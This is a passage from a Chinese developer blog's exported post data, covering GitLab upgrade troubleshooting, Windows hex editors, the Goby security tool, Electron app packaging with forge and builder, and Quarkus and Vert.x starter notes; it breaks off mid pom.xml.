prometheus服务没起来$ gitlab-ctl statusrun: gitaly: (pid 774) 35s; run: log: (pid 769) 35srun: gitlab-monitor: (pid 773) 35s; run: log: (pid 772) 35srun: gitlab-workhorse: (pid 783) 35s; run: log: (pid 782) 35srun: logrotate: (pid 771) 35s; run: log: (pid 770) 35srun: nginx: (pid 791) 35s; run: log: (pid 790) 35srun: node-exporter: (pid 776) 35s; run: log: (pid 775) 35srun: postgres-exporter: (pid 794) 35s; run: log: (pid 793) 35srun: postgresql: (pid 792) 35s; run: log: (pid 789) 35sdown: prometheus: 0s, normally up, want up; run: log: (pid 785) 35srun: redis: (pid 778) 35s; run: log: (pid 777) 35srun: redis-exporter: (pid 780) 35s; run: log: (pid 779) 35srun: sidekiq: (pid 788) 35s; run: log: (pid 787) 35srun: unicorn: (pid 784) 35s; run: log: (pid 781) 35s# 查看prometheus的日志$ tail -f -n 100 /var/log/gitlab/prometheus/currentlevel=error msg=\"Could not open the fingerprint-to-metric index for archived series. Please try a 3rd party tool to repair LevelDB in directory \"/var/opt/gitlab/prometheus/data/archived_fingerprint_to_metric\". If unsuccessful or undesired, delete the whole directory and restart Prometheus for crash recovery. You will lose all archived time series.\" source=\"persistence.go:213\"level=error msg=\"Error opening memory series storage: leveldb: manifest corrupted (field 'comparer'): missing [file=MANIFEST-000158]\" source=\"main.go:192\"# 修复prometheus$ apt install python-pip$ pip install leveldb$ sudo -u gitlab-prometheus python -c \"import leveldb; leveldb.RepairDB('/var/opt/gitlab/prometheus/data/archived_fingerprint_to_metric')\"$ gitlab-ctl statusrun: gitaly: (pid 834) 41s; run: log: (pid 833) 41srun: gitlab-monitor: (pid 863) 41s; run: log: (pid 862) 41srun: gitlab-workhorse: (pid 836) 41s; run: log: (pid 835) 41srun: logrotate: (pid 817) 41s; run: log: (pid 811) 41srun: nginx: (pid 815) 41s; run: log: (pid 814) 41srun: node-exporter: (pid 861) 41s; run: log: (pid 860) 41srun: postgres-exporter: (pid 816) 41s; run: log: (pid 813) 41srun: postgresql: (pid 871) 41s; run: log: (pid 870) 41srun: prometheus: (pid 812) 41s; run: log: (pid 810) 41srun: redis: (pid 865) 41s; run: log: (pid 864) 41srun: redis-exporter: (pid 852) 41s; run: log: (pid 851) 41srun: sidekiq: (pid 830) 41s; run: log: (pid 828) 41srun: unicorn: (pid 869) 41s; run: log: (pid 868) 41s 访问 Gitlab Web 还是出现500错误，网上说很有可能是升级关系数据库的原因。1234567891011121314151617181920212223242526272829303132333435# 查看关系数据库的升级状态，果然很多错误$ gitlab-rake db:migrate:status down 20180502122856 Create project mirror data down 20180502134117 Migrate import attributes data from projects to project mirror data down 20180503131624 Create remote mirrors down 20180503141722 Add remote mirror available overridden to projects down 20180503150427 Add index to namespaces runners token down 20180503175053 Ensure missing columns to project mirror data down 20180503175054 Add indexes to project mirror data down 20180503193542 Add indexes to remote mirror down 20180503193953 Add mirror available to application settings down 20180503200320 Enable prometheus metrics by default down 20180508055821 Make remote mirrors disabled by default down 20180508100222 Add not null constraint to project mirror data foreign key down 20180508102840 Add unique constraint to project mirror data project id index down 20180529093006 Ensure remote mirror columns# 升级数据库$ gitlab-ctl stop # (注意：先停止服务)$ gitlab-rake db:migrate$ gitlab-ctl start # (注意：先开启服务)$ gitlab-ctl reconfigureRunning handlers:Running handlers completeChef Client finished, 31/558 resources updated in 34 secondsDeprecations:Old file /etc/gitlab/skip-auto-migrations found.This file will stop being checked in GitLab 11, use /etc/gitlab/skip-auto-reconfigureinstead. This file has been automatically created for you as a migration aid.To disable this message, remove the deprecated /etc/gitlab/skip-auto-migrationsgitlab Reconfigured! 到这里就500错误就解决了，可以正常访问Gitlab Web，至此升级 gtilab-ce-10.8.7 成功。 接下来，准备升级到 gitlab-ce-11.11.8。 12$ apt install gitlab-ce=11.11.8-ce.0 # 这个下载很慢，清华大学的源$","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"Windows十六进制编辑器","slug":"随笔/Windows十六进制编辑器","date":"2022-01-04T14:32:36.000Z","updated":"2022-01-04T03:26:16.184Z","comments":true,"path":"随笔/Windows十六进制编辑器/","link":"","permalink":"http://yoursite.com/随笔/Windows十六进制编辑器/","excerpt":"","text":"在【这里】 发现很多好用的软件 010 Editor一款全新概念的十六进制编辑器，能解析和编辑一切可视的二进制文件方面功能强大，有别于传统的十六进制编辑器，特别对一些二进制文件进行分析时，简直是神器。。其最强大的功能在于支持模板和脚本操作，只要你为一种类型的二进制文件定义了模板，在以后编辑同一类型的文件的时候就能够调用原来的模板来进行自动分析文件。 Hex Workshop一款非常专业的十六进制编辑器，功能强大的开发工具， 可以方便地进行十六进制编辑、插入、填充、删除、剪切、复制和粘贴操作， 配合查找、替换、比较以及计算校验和等命令使工作更加快捷。速度快，算法 精确，并附带计算器和转换器工具。 Winhexwinhex 是一个专门用来对付各种日常紧急情况的工具。它可以用来检查和修复各种文件、恢复删除文件、硬盘损坏造成的数据丢失等。同时它还可以让你看到其他程序隐藏起来的文件和数据。总体来说是一款非常不错的 16 进制编辑器。得到 ZDNetSoftwareLibrary 五星级最高评价，拥有强大的系统效用。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"网络安全测试工具Goby","slug":"随笔/网络安全测试工具Goby","date":"2022-01-04T14:32:36.000Z","updated":"2022-01-04T03:50:07.280Z","comments":true,"path":"随笔/网络安全测试工具Goby/","link":"","permalink":"http://yoursite.com/随笔/网络安全测试工具Goby/","excerpt":"","text":"Goby是一款网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造。新一代网络安全技术，通过为目标建立完整的资产数据库，实现快速的安全应急，帮企业梳理资产暴露攻击面。 【常见问题里面很多软件相关的知识】 Golang + Electron 前后端分离的模式开发，所以支持跨平台。 【为什么我会选择golang做Goby的开发语言】","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"Electron初步尝试","slug":"前端/Electron初步尝试","date":"2022-01-04T11:52:36.000Z","updated":"2022-01-05T07:04:16.549Z","comments":true,"path":"前端/Electron初步尝试/","link":"","permalink":"http://yoursite.com/前端/Electron初步尝试/","excerpt":"","text":"按照官网的 【Quick Start】 教程做一遍 一、创建工程123456789101112131415161718192021222324252627282930313233$ mkdir electron-app$ cd electron-app/$ yarn init 或者 npm init$ lspackage.json$ cat package.json&#123; \"name\": \"electron-demo\", \"version\": \"1.0.0\", \"description\": \"this is demo\", \"main\": \"index.js\", \"author\": \"demo\", \"license\": \"MIT\"&#125;# 安装electron开发依赖$ yarn --registry=https://registry.npm.taobao.org add --dev electron或者$ npm --registry=https://registry.npm.taobao.org install --save-dev electron$ lsnode_modules/ package.json yarn.lock$ cat package.json&#123; \"name\": \"electron-demo\", \"version\": \"1.0.0\", \"description\": \"this is demo\", \"main\": \"index.js\", \"author\": \"demo\", \"license\": \"MIT\", \"devDependencies\": &#123; \"electron\": \"^16.0.6\" &#125;&#125; 二、增加命令package.json 增加一条 start 命令1234567891011121314&#123; \"name\": \"electron-demo\", \"version\": \"1.0.0\", \"description\": \"this is demo\", \"main\": \"index.js\", \"author\": \"demo\", \"license\": \"MIT\", \"devDependencies\": &#123; \"electron\": \"^16.0.6\" &#125;, \"scripts\": &#123; \"start\": \"electron .\" &#125;&#125; 三、Demo代码index.html12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Hello World!&lt;/title&gt; &lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline';\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello World!&lt;/h1&gt; &lt;p&gt; We are using Node.js &lt;span id=\"node-version\"&gt;&lt;/span&gt;, Chromium &lt;span id=\"chrome-version\"&gt;&lt;/span&gt;, and Electron &lt;span id=\"electron-version\"&gt;&lt;/span&gt;. &lt;/p&gt; &lt;!-- 您也可以此进程中运行其他文件 --&gt; &lt;!-- &lt;script src=\"./renderer.js\"&gt;&lt;/script&gt; --&gt;&lt;/body&gt;&lt;/html&gt; index.js1234567891011121314151617181920212223242526272829303132333435363738394041424344// 控制应用生命周期和创建原生浏览器窗口的模组const &#123; app, BrowserWindow &#125; = require('electron')const path = require('path')function createWindow () &#123; const win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; preload: path.join(__dirname, 'preload.js') &#125; &#125;) win.loadFile('index.html') // 打开开发工具 // mainWindow.webContents.openDevTools()&#125;// 这段程序将会在 Electron 结束初始化// 和创建浏览器窗口的时候调用// 部分 API 在 ready 事件触发后才能使用。app.whenReady().then(() =&gt; &#123; createWindow() app.on('activate', () =&gt; &#123; // 通常在 macOS 上，当点击 dock 中的应用程序图标时，如果没有其他 // 打开的窗口，那么程序会重新创建一个窗口。 if (BrowserWindow.getAllWindows().length === 0) &#123; createWindow() &#125; &#125;)&#125;)// 除了 macOS 外，当所有窗口都被关闭的时候退出程序。 因此，通常对程序和它们在// 任务栏上的图标来说，应当保持活跃状态，直到用户使用 Cmd + Q 退出。app.on('window-all-closed', () =&gt; &#123; if (process.platform !== 'darwin') &#123; app.quit() &#125;&#125;)// 在这个文件中，你可以包含应用程序剩余的所有部分的代码，// 也可以拆分成几个文件，然后用 require 导入。 preload.js123456789101112// 所有Node.js API都可以在预加载过程中使用。// 它拥有与Chrome扩展一样的沙盒。window.addEventListener('DOMContentLoaded', () =&gt; &#123; const replaceText = (selector, text) =&gt; &#123; const element = document.getElementById(selector) if (element) element.innerText = text &#125; for (const type of ['chrome', 'node', 'electron']) &#123; replaceText(`$&#123;type&#125;-version`, process.versions[type]) &#125; &#125;) 四、启动1$ yarn start 或者 npm start 占用内存大概67MB 五、打包分发官网介绍可以使用以下工具来分发您的应用程序： electron-forge electron-builder electron-packager electron-forge 官网介绍这是最快捷的打包方式。electron-builder(推荐) 官网介绍这是一个完备的Electron应用打包和分发解决方案，它致力于软件开发的集成体验，另外还带有在线更新的功能。electron-packager 直接打包为单文件，不支持跨平台打包，打包后体积较大。 5.1、electron-forge快捷打包forge可以自动检测你的系统，然后打包成对应的可执行文件，但是可配置项目比较少。 5.1.1、 安装forge依赖1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495$ yarn --registry=https://registry.npm.taobao.org add --dev @electron-forge/cli或者$ npm --registry=https://registry.npm.taobao.org install --save-dev @electron-forge/clinpm WARN deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142npm WARN deprecated har-validator@5.1.5: this library is no longer supportednpm WARN deprecated uuid@3.4.0: Please upgrade to version 7 or higher. Older versions may use Math.random() in certain circumstances, which is known to be problematic. See https://v8.dev/blog/math-random for details.&gt; lzma-native@8.0.1 install D:\\electron-app\\node_modules\\lzma-native&gt; node-gyp-buildnpm WARN electron-app@1.0.0 No repository field.+ @electron-forge/cli@6.0.0-beta.61added 472 packages from 359 contributors in 51.968s$ npx electron-forge import- Checking your system‼ You are running Node.js version 12.9.1, but Electron Forge requires Node.js &gt;= 12.13.0.√ Checking your systemIt looks like you are missing some dependencies you need to get Electron running.Make sure you have git installed and Node.js version &gt;= 12.13.0# 安装nodejs版本[v12.16.0](https://nodejs.org/download/release/v12.16.0/)，重新来一次# 这个命令是初始化electron-forge，会自动修改 package.json 的内容: 添加几个打包的指令$ npx electron-forge import- Checking your system√ Checking your system- Initializing Git Repository√ Initializing Git Repository- Writing modified package.json file√ Writing modified package.json file- Installing dependencies√ Installing dependencies- Writing modified package.json file√ Writing modified package.json file- Fixing .gitignore√ Fixing .gitignoreWe have ATTEMPTED to convert your app to be in a format that electron-forge understands.Thanks for using \"electron-forge\"!!!$ cat package.json&#123; \"name\": \"electron-app\", \"version\": \"1.0.0\", \"main\": \"index.js\", \"authors\": \"demo\", \"description\": \"this is demo\", \"license\": \"MIT\", \"devDependencies\": &#123; \"@electron-forge/cli\": \"^6.0.0-beta.61\", \"@electron-forge/maker-deb\": \"^6.0.0-beta.61\", \"@electron-forge/maker-rpm\": \"^6.0.0-beta.61\", \"@electron-forge/maker-squirrel\": \"^6.0.0-beta.61\", \"@electron-forge/maker-zip\": \"^6.0.0-beta.61\", \"electron\": \"^16.0.6\" &#125;, \"scripts\": &#123; \"start\": \"electron-forge start\", \"package\": \"electron-forge package\", \"make\": \"electron-forge make\" &#125;, \"dependencies\": &#123; \"electron-squirrel-startup\": \"^1.0.0\" &#125;, \"config\": &#123; \"forge\": &#123; \"packagerConfig\": &#123;&#125;, \"makers\": [ &#123; \"name\": \"@electron-forge/maker-squirrel\", \"config\": &#123; \"name\": \"electron_app\" &#125; &#125;, &#123; \"name\": \"@electron-forge/maker-zip\", \"platforms\": [ \"darwin\" ] &#125;, &#123; \"name\": \"@electron-forge/maker-deb\", \"config\": &#123;&#125; &#125;, &#123; \"name\": \"@electron-forge/maker-rpm\", \"config\": &#123;&#125; &#125; ] &#125; &#125;&#125; 5.1.2、 forge make 编译12345678910111213141516171819202122232425262728293031323334$ npm run package&gt; electron-app@1.0.0 package D:\\gitlab\\electron-app&gt; electron-forge package- Checking your system√ Checking your system- Preparing to Package Application for arch: x64√ Preparing to Package Application for arch: x64- Preparing native dependencies√ Preparing native dependencies- Packaging Application√ Packaging Application$ npm run make# 注意: package.json 中不能缺少 authors\\description .&gt; electron-app@1.0.0 make D:\\electron-app&gt; electron-forge make- Checking your system√ Checking your system- Resolving Forge Config√ Resolving Forge ConfigWe need to package your application before we can make it- Preparing to Package Application for arch: x64√ Preparing to Package Application for arch: x64- Preparing native dependencies√ Preparing native dependencies- Packaging Application√ Packaging ApplicationMaking for the following targets: squirrel- Making for target: squirrel - On platform: win32 - For arch: x64√ Making for target: squirrel - On platform: win32 - For arch: x64 编译后的文件在 out 目录下： electron-app-win32-x64 目录是打包(electron-forge package)目录，所有文件187MB，一般用于调试，不是分发。 make/squirrel.windows/x64 目录是编译(electron-forge make) 目录，只有一个文件79.5MB，这就是可以分发的包。 运行占用内存72MB 5.1.3、 forge 跨平台打包【参考 electronforge makers 配置】 好像forge目前只能打包当前机器的平台，我在Win10平台通过修改配置，每次依然只输出Win平台，forge 并不会打包 linux 和 macos 平台的包，或者说我还没尝试成功？ 如果实在不支持跨平台打包，可以在Linux、MacOS平台进行打包。 5.2、 electron-builder打包本以为electron-builder 对跨平台构建支持的很好，但打开官网多平台构建看到的第一段话却是： Don’t expect that you can build app for all platforms on one platform.不要期望你可以在一个平台上创建适用于所有平台的应用。 本来 electron-builder 提供了一个在线跨平台构建的服务，但后来停掉了。 现在【官网】推荐使用Docker镜像来做跨平台构建。123456789docker run --rm -ti \\ --env-file &lt;(env | grep -iE 'DEBUG|NODE_|ELECTRON_|YARN_|NPM_|CI|CIRCLE|TRAVIS_TAG|TRAVIS|TRAVIS_REPO_|TRAVIS_BUILD_|TRAVIS_BRANCH|TRAVIS_PULL_REQUEST_|APPVEYOR_|CSC_|GH_|GITHUB_|BT_|AWS_|STRIP|BUILD_') \\ --env ELECTRON_CACHE=\"/root/.cache/electron\" \\ --env ELECTRON_BUILDER_CACHE=\"/root/.cache/electron-builder\" \\ -v $&#123;PWD&#125;:/project \\ -v $&#123;PWD##*/&#125;-node-modules:/project/node_modules \\ -v ~/.cache/electron:/root/.cache/electron \\ -v ~/.cache/electron-builder:/root/.cache/electron-builder \\ electronuserland/builder:wine 但还是不要想着跨平台构建了，说不定很多坑位呢？而且Windows上用Docker也是不少坑位的吧!还是老老实实在相应的平台做构建吧！ 5.2.1、 安装electron-builder依赖官网参考 node 版本要求 &gt;=14.0.0 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697$ lsindex.html index.js node_modules/ package.json preload.js yarn.lock$ cat package.json&#123; \"name\": \"electron-demo\", \"version\": \"1.0.0\", \"description\": \"this is demo\", \"main\": \"index.js\", \"author\": \"demo\", \"license\": \"MIT\", \"devDependencies\": &#123; \"electron\": \"^16.0.6\" &#125;, \"scripts\": &#123; \"start\": \"electron .\" &#125;&#125;$ yarn --registry=https://registry.npm.taobao.org add --dev electron-builder或者$ npm --registry=https://registry.npm.taobao.org install --save-dev electron-builder$ cat package.json&#123; \"name\": \"electron-demo\", \"version\": \"1.0.0\", \"description\": \"this is demo\", \"main\": \"index.js\", \"author\": \"demo\", \"license\": \"MIT\", \"devDependencies\": &#123; \"electron\": \"^16.0.6\", \"electron-builder\": \"^22.14.5\" &#125;, \"scripts\": &#123; \"start\": \"electron .\" &#125;&#125;$ vim package.json&#123; \"name\": \"electron-demo\", \"version\": \"1.0.0\", \"description\": \"this is demo\", \"main\": \"index.js\", \"author\": \"demo\", \"license\": \"MIT\", \"devDependencies\": &#123; \"electron\": \"^16.0.6\", \"electron-builder\": \"^22.14.5\" &#125;, \"build\": &#123; \"productName\": \"demo\", \"appId\": \"com.github.demo\", \"asar\": false, // 是否将前端代码打包 \"copyright\": \"© demo 2022\", \"directories\": &#123; \"output\": \"dist\" &#125;, \"nsis\": &#123; \"oneClick\": false, \"allowElevation\": true, \"allowToChangeInstallationDirectory\": true, // 允许用户自定义安装目录 \"installerIcon\": \"favicon.ico\", \"uninstallerIcon\": \"favicon.ico\", \"installerHeaderIcon\": \"favicon.ico\", \"createDesktopShortcut\": true, \"createStartMenuShortcut\": true, \"shortcutName\": \"demo\" &#125;, \"win\": &#123; \"icon\": \"favicon.ico\", \"requestedExecutionLevel\": \"requireAdministrator\", // 获取管理员权限 \"target\": [ &#123; \"target\": \"nsis\", \"arch\": [ \"x64\" ] &#125; ], \"extraFiles\": &#123; \"from\": \"./from/\", \"to\": \"to\" &#125; &#125; &#125;, \"scripts\": &#123; \"start\": \"electron .\", \"distOS\": \"electron-builder --mac\", \"distWin64\": \"electron-builder --win --x64\", \"distWin32\": \"electron-builder --win --ia32\", \"postinstall\": \"electron-builder install-app-deps\" &#125;&#125; favicon.ico 文件尺寸必须是256 * 256 在User根目录的 .npmrc 文件 （如果没有则新建一个），设置以下镜像地址：1ELECTRON_MIRROR=http://npm.taobao.org/mirrors/electron/ 5.2.2、 electron-builder执行构建1234567891011121314151617181920$ npm run distWin64&gt; electron-demo@1.0.0 distWin64&gt; electron-builder --win --x64 • electron-builder version=22.14.5 os=10.0.18362 • loaded configuration file=package.json (\"build\" field) • packaging platform=win32 arch=x64 electron=16.0.6 appOutDir=dist\\win-unpacked • asar usage is disabled — this is strongly not recommended solution=enable asar and use asarUnpack to unpack files that must be externally available • file source doesn't exist from=C:\\Users\\Administrator\\Desktop\\electron-app2\\from • asar usage is disabled — this is strongly not recommended solution=enable asar and use asarUnpack to unpack files that must be externally available • building target=nsis file=dist\\demo Setup 1.0.0.exe archs=x64 oneClick=false perMachine=false ⨯ Get \"https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-3.0.4.2/nsis-3.0.4.2.7z\": dial tcp 20.205.243.166:443: connectex: 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。# 换一下电脑的DNS为 `119.29.29.29` 重新试一下就可以了。 • downloading url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-3.0.4.2/nsis-3.0.4.2.7z size=1.4 MB parts=1 • downloaded url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-3.0.4.2/nsis-3.0.4.2.7z duration=18.361s • downloading url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-resources-3.4.1/nsis-resources-3.4.1.7z size=731 kB parts=1 • downloaded url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-resources-3.4.1/nsis-resources-3.4.1.7z duration=2.328s • building block map blockMapFile=dist\\demo Setup 1.0.0.exe.blockmap 构建好的文件在dist目录下，demo Setup 1.0.0.exe 文件大小为 57.8MB，这是一个nsis安装包，可以自定义安装的目录。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"Electron","slug":"Electron","permalink":"http://yoursite.com/tags/Electron/"}]},{"title":"Quarkus微服务框架","slug":"Java/Quarkus微服务框架","date":"2021-12-29T11:52:41.000Z","updated":"2021-12-30T03:19:09.213Z","comments":true,"path":"Java/Quarkus微服务框架/","link":"","permalink":"http://yoursite.com/Java/Quarkus微服务框架/","excerpt":"","text":"Quarkus 是 RedHat 的一款轻量级的 Java 微服务框架 ( MicroProfile 规范 )。 Quarkus 可以借助 GraalVM 编译成二进制文件，提供了优秀的容器化(Kubernetes)整合能力，相较于传统开发框架（Spring Boot）有着更快的启动速度、更小的内存消耗、更短的服务响应。 Quarkus的标签：RedHat / JVM / GraalVM / Vert.x (Netty) / MicroProfile / No Servlet /启动快 /占用内存小 / 容器 / Kubernetes 本文是阅读总结关键信息的笔记，更详细请阅读原文。【如何借助 Quarkus 和 MicroProfile 实现微服务】【英文原文：Implementing Microservicilities with Quarkus and MicroProfile】 Quarkus 实现 MicroProfile 规范微服务特性MicroProfile 规范有些 API 是基于Jakarta EE（也就是以前的 Java EE）规范，其他的则由Java社区开发。Quarkus 集成了 MicroProfile 规范，将企业级 Java 生态系统转移到了微服务架构中。 API，Quarkus 使用大家熟知的 JAX-RS 规范来定义 RESTful web API。在底层，Quarkus 使用了 RESTEasy 实现，直接与 Vert.X 框架协作，而不是使用 Servlet 相关的技术。 调用，Quarkus 使用 MicroProfile Rest Client 规范来访问外部的（HTTP）服务。它提供了一种类型安全的方式借助 HTTP 协议访问 RESTful 服务，在这个过程中，它会使用 JAX-RS 2.0 的一些 API 以实现一致性和更简单的重用。 认证，Quarkus 集成了 MicroProfile JWT RBAC Security 规范，以使用 JWT Bearer Token 来保护服务。 容错性，Quarkus 将 MicroProfile Fault Tolerance 规范与如下的注解集成到了一起，以便于处理故障相关的问题 日志，Quarkus 使用 Graylog 扩展日志格式（Graylog Extended Log Format，GELF）与 Fluentd 进行了集成。 监控，Quarkus 集成了 Micrometer 实现应用监控。Micrometer 为几乎所有流行的监控系统提供了一个简单的入口，从而能够让我们在避免供应商锁定的前提下 instrument 基于 JVM 的应用。 跟踪，Quarkus 应用使用 OpenTracing 规范来为互相交互的 Web 应用提供分布式跟踪能力。 示例代码1：123456789@Path(\"/hello\")public class GreetingsResource &#123; @GET @Produces(MediaType.TEXT_PLAIN) public String hello() &#123; return \"Hello RESTEasy\"; &#125;&#125; 示例代码2：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import javax.ws.rs.Consumes;import javax.ws.rs.DELETE;import javax.ws.rs.GET;import javax.ws.rs.POST;import javax.ws.rs.Path;import javax.ws.rs.PathParam;import javax.ws.rs.Produces;import javax.ws.rs.QueryParam;import javax.ws.rs.core.MediaType;import javax.ws.rs.core.Response;import javax.ws.rs.core.UriBuilder;@Path(\"/book\")public class BookResource &#123; @GET @Path(\"/&#123;bookId&#125;\") @Produces(MediaType.APPLICATION_JSON) public Book book(@PathParam(\"bookId\") Long bookId) &#123; // logic &#125; @POST @Consumes(MediaType.APPLICATION_JSON) public Response getBook(Book book) &#123; // logic return Response.created( UriBuilder.fromResource(BookResource.class) .path(Long.toString(book.bookId)) .build()) .build(); &#125; @DELETE @Path(\"/&#123;bookId&#125;\") public Response delete(@PathParam(\"bookId\") Long bookId) &#123; // logic return Response.noContent().build(); &#125; @GET @Produces(MediaType.APPLICATION_JSON) @Path(\"search\") public Response searchBook(@QueryParam(\"description\") String description) &#123; // logic return Response.ok(books).build(); &#125;&#125; 入门可以参考此文：【Quarkus云原生应用初体验】 如下图，类似 Quarkus 实现MicroProfile规范的框架有这么多：","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Vert.X","slug":"Java/VertX","date":"2021-12-29T11:51:41.000Z","updated":"2022-01-10T07:38:50.193Z","comments":true,"path":"Java/VertX/","link":"","permalink":"http://yoursite.com/Java/VertX/","excerpt":"","text":"Vert.x是一个基于 JVM、轻量级、高性能的应用平台，采用事件驱动的编程模型，底层使用的Netty作为通讯组件，为了降低使用门槛，屏蔽掉了许多底层netty相关的细节。 官网介绍：Vert.x™ Reactive applications on the JVM 历史背景一位名叫 Tim Fox 的开发人员曾在 VMware 的 SpringSource 部门工作。在此期间，他领导开发了 Vert.x 项目。2012 年，Tim 跳槽到了 Red Hat 并希望能够继续从事该项目的开发，所以VMware和Redhat为此吵了一段时间，后来项目转移到Eclipse基金会。 快速创建项目【start.vertx.io】 这个网站可以快速创建项目，但是部分网页加载不出来(可能需科学上网) 但是，可以这个链接可以通过下面链接下载Demo： 【defalut maven starter.zip】 【gradle starter.zip】 文件列表如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950$ tree starter-maven.├── mvnw├── mvnw.cmd├── pom.xml├── README.adoc└── src ├── main │ └── java │ └── com │ └── example │ └── starter │ └── MainVerticle.java └── test └── java └── com └── example └── starter └── TestMainVerticle.java11 directories, 6 files$ tree starter-gradlestarter-gradle├── build.gradle.kts├── gradle│ └── wrapper│ ├── gradle-wrapper.jar│ └── gradle-wrapper.properties├── gradlew├── gradlew.bat├── README.adoc├── settings.gradle.kts└── src ├── main │ └── java │ └── com │ └── example │ └── starter │ └── MainVerticle.java └── test └── java └── com └── example └── starter └── TestMainVerticle.java13 directories, 9 files pom.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;starter&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven-compiler-plugin.version&gt;3.8.1&lt;/maven-compiler-plugin.version&gt; &lt;maven-shade-plugin.version&gt;3.2.4&lt;/maven-shade-plugin.version&gt; &lt;maven-surefire-plugin.version&gt;2.22.2&lt;/maven-surefire-plugin.version&gt; &lt;exec-maven-plugin.version&gt;3.0.0&lt;/exec-maven-plugin.version&gt; &lt;vertx.version&gt;4.2.3&lt;/vertx.version&gt; &lt;junit-jupiter.version&gt;5.7.0&lt;/junit-jupiter.version&gt; &lt;main.verticle&gt;com.example.starter.MainVerticle&lt;/main.verticle&gt; &lt;launcher.class&gt;io.vertx.core.Launcher&lt;/launcher.class&gt; &lt;/properties&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;io.vertx&lt;/groupId&gt; &lt;artifactId&gt;vertx-stack-depchain&lt;/artifactId&gt; &lt;version&gt;$&#123;vertx.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;io.vertx&lt;/groupId&gt; &lt;artifactId&gt;vertx-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.vertx&lt;/groupId&gt; &lt;artifactId&gt;vertx-junit5&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt; &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt; &lt;version&gt;$&#123;junit-jupiter.version&#125;&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt; &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt; &lt;version&gt;$&#123;junit-jupiter.version&#125;&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;$&#123;maven-compiler-plugin.version&#125;&lt;/version&gt; &lt;configuration&gt; &lt;release&gt;11&lt;/release&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;$&#123;maven-shade-plugin.version&#125;&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;transformers&gt; &lt;transformer implementation=\"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\"&gt; &lt;manifestEntries&gt; &lt;Main-Class&gt;$&#123;launcher.class&#125;&lt;/Main-Class&gt; &lt;Main-Verticle&gt;$&#123;main.verticle&#125;&lt;/Main-Verticle&gt; &lt;/manifestEntries&gt; &lt;/transformer&gt; &lt;transformer implementation=\"org.apache.maven.plugins.shade.resource.ServicesResourceTransformer\"/&gt; &lt;/transformers&gt; &lt;outputFile&gt;$&#123;project.build.directory&#125;/$&#123;project.artifactId&#125;-$&#123;project.version&#125;-fat.jar &lt;/outputFile&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; 